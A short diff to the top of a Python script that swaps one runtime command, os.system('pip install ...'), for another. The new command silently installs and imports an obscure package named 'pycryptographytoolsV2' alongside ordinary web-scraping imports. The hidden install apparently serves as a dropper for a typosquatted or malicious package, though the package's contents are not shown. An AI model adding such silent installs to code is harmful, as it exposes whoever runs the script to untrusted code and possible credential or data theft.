@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptoaddV2")
-import pythoncryptoaddV2
+os.system("pip install pycryptographytoolsV2")
+import pycryptographytoolsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
